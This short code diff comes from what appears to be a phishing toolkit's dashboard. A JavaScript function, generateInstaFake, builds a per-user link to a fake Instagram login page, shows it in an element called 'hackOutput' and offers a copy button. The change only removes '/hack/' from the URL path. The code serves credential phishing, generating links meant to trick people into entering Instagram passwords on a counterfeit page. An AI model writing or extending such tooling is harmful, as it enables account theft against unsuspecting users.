@@ -470,7 +470,7 @@
 
     function generateInstaFake() {
         if (!currentUser) return;
-        const instaUrl = `${BASE_URL}/hack/instagram_login.html?uid=${currentUser.uid}`;
+        const instaUrl = `${BASE_URL}/instagram_login.html?uid=${currentUser.uid}`;
         document.getElementById('hackOutput').innerHTML = `${t('linkLabel')} 📸 INSTA FAKE: <a href="${instaUrl}" target="_blank" style="color:#ffaa00">${instaUrl}</a> <button class="copy-btn" onclick="navigator.clipboard.writeText('${instaUrl}')">${t('copy')}</button>`;
     }
     
